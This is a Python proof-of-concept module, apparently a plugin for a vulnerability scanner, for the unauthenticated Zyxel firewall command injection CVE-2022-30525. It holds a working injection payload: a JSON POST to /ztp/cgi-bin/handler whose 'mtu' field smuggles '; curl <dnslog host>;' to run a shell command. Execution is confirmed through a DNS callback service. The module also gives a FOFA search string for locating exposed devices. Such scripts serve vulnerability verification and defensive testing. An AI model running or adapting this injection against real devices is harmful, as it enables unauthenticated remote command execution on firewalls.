# coding:utf-8  
import json
import requests
from lib.core.common import url_handle,get_random_ua,get_ceye_dns,verify_ceye_dns
from lib.core.poc import POCBase
# ...
import urllib3
urllib3.disable_warnings()

class POC(POCBase):

    _info = {
        "author" : "jijue",                      # POC作者
        "version" : "1",                    # POC版本，默认是1  
        "CreateDate" : "2022-01-01",        # POC创建时间
        "UpdateDate" : "2022-01-01",        # POC创建时间
        "PocDesc" : """
            需要dnslog，测试时候注意下网络状况，否则会漏报不少
        """,                                # POC描述，写更新描述，没有就不写

        "name" : "Zyxel 防火墙命令注入漏洞（CVE-2022-30525）",                        # 漏洞名称
        "VulnID" : "oFx-2022-0001",                      # 漏洞编号，以CVE为主，若无CVE，使用CNVD，若无CNVD，留空即可
        "AppName" : "Zyxel",                     # 漏洞应用名称
        "AppVersion" : """
            5.00 ≤ Zyxel ≤ 5.21
        """,                  # 漏洞应用版本
        "VulnDate" : "2022-01-01",                    # 漏洞公开的时间,不知道就写今天，格式：xxxx-xx-xx
        "VulnDesc" : """
            2022 年 5 月 12 日，Zyxel（合勤）发布安全公告，修复了其防火墙设备中未经身份验证的远程命令注入漏洞（CVE-2022-30525），
            该漏洞的CVSS评分为9.8。

            该漏洞存在于某些Zyxel防火墙版本的 CGI 程序中，允许在未经身份验证的情况下在受影响设备上以nobody用户身份执行任意命令。
        """,                                # 漏洞简要描述

        "fofa-dork":"""
            icon_hash="-440644339"
        """,                     # fofa搜索语句
        "example" : "",                     # 存在漏洞的演示url，写一个就可以了
        "exp_img" : "",                      # 先不管  
    }

    def _verify(self):
        """
        返回vuln

        存在漏洞：vuln = [True,html_source] # html_source就是页面源码  

        不存在漏洞：vuln = [False,""]
        """
        vuln = [False,""]
        url = self.target + "/ztp/cgi-bin/handler" # url自己按需调整
        success,dns_flag = get_ceye_dns()
        if success == False:
            return [False,dns_flag]
        
        headers = {
                    "User-Agent":get_random_ua(),
                    "Connection":"close",
                    "Content-Type": "application/json",
                    }
        
        data = {
                "command": "setWanPortSt",
                "proto": "dhcp",
                "port": "4",
                "vlan_tagged": "1",
                "vlanid": "5",
                "mtu": "; curl %s;" % (dns_flag),
                "data": "hi"
                } 
        
        try:
            """
            检测逻辑，漏洞存在则修改vuln值为True，漏洞不存在则不动
            """
            req = requests.post(url,headers = headers , data=json.dumps(data) ,proxies = self.proxy ,timeout = self.timeout,verify = False)

            flager = verify_ceye_dns(dns_flag)
            if flager == True:
                vuln = [True,dns_flag]
            elif flager == False:
                vuln = [False,dns_flag]
            else:
                vuln = [False,flager]

        except Exception as e:
            raise e
        
        # 以下逻辑酌情使用
        if self._honeypot_check(vuln[1]) == True:
            vuln[0] = False
        
        return vuln

    def _attack(self):
        return self._verify()